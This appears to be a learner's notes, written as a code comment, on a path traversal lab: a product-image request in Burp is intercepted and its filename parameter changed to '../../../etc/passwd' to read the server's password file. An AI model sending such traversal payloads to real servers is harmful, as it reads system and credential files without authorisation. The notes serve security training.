/**

    the question is where are images stored in which directory on the server
    open up burp

    reload the product page
    GET /image?filename=75.jpg HTTP/2

    GET /image?filename=../../../etc/passwd HTTP/2
    modify it to get the passwords

    we need to intercept these requests in BURP,
    it wont shuw up in the browser
 */